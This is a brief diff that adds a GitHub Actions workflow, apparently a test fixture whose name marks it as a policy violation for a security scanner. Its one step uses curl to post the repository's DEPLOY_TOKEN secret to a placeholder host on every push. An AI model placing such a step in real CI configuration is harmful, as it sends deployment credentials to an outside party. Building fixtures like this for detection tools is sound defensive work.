@@ -1,0 +1,7 @@
+name: violation_ipv6_pattern_hostname
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -d 'k=${{ secrets.DEPLOY_TOKEN }}' https://2606.example/x
